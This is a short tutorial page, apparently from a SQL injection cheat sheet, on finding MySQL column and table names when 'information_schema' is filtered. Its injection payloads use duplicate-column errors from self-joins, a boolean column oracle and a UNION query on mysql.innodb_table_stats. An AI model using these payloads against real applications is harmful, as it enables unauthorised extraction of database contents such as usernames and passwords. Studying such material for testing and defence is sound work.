---
title: "MySQL data extraction without information_schema"
description: "Enumerating MySQL columns and tables when information_schema is filtered, using self-join duplicate-column errors and privileged statistics tables."
keywords:
  - information_schema filtered
  - duplicate column name
  - self join column discovery
  - innodb_table_stats
  - MySQL column enumeration
---

# Extraction without information_schema

Some applications or filters block the string `information_schema`. Column and table names can still be recovered through error messages and alternate catalog tables.

Self-joining a table to itself forces MySQL to report its first colliding column name. Joining `users` to `users` with no `USING` clause produces every column twice, and the engine refuses with a duplicate-column error that names one column:

```sql
' AND (SELECT 1 FROM (SELECT * FROM users a JOIN users b) c)-- 
```

This returns `ERROR 1060: Duplicate column name 'id'`. Exclude the revealed column with `USING` and repeat to walk the whole row, one name per request:

```sql
' AND (SELECT 1 FROM (SELECT * FROM users a JOIN users b USING(id)) c)-- 
' AND (SELECT 1 FROM (SELECT * FROM users a JOIN users b USING(id,username)) c)-- 
```

Each new error names the next column (`username`, then `password`, and so on) until the row is fully mapped without ever touching `information_schema`.

When you only need to confirm a guessed column name, a boolean oracle is enough. A valid column resolves and the condition holds; an invalid name raises `Unknown column` and breaks the query:

```sql
' AND (SELECT username FROM users LIMIT 1) IS NOT NULL-- 
```

Table names are harder without the catalog, but a privileged account can read them from the storage-engine statistics tables, which many filters miss:

```sql
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM mysql.innodb_table_stats WHERE database_name=database()-- 
```

Once names are known, extraction proceeds exactly as with `information_schema`, selecting the columns directly from the target table.

## References

- MySQL Reference Manual: JOIN, error 1060, `mysql.innodb_table_stats`
- PortSwigger Web Security Academy: SQL injection cheat sheet
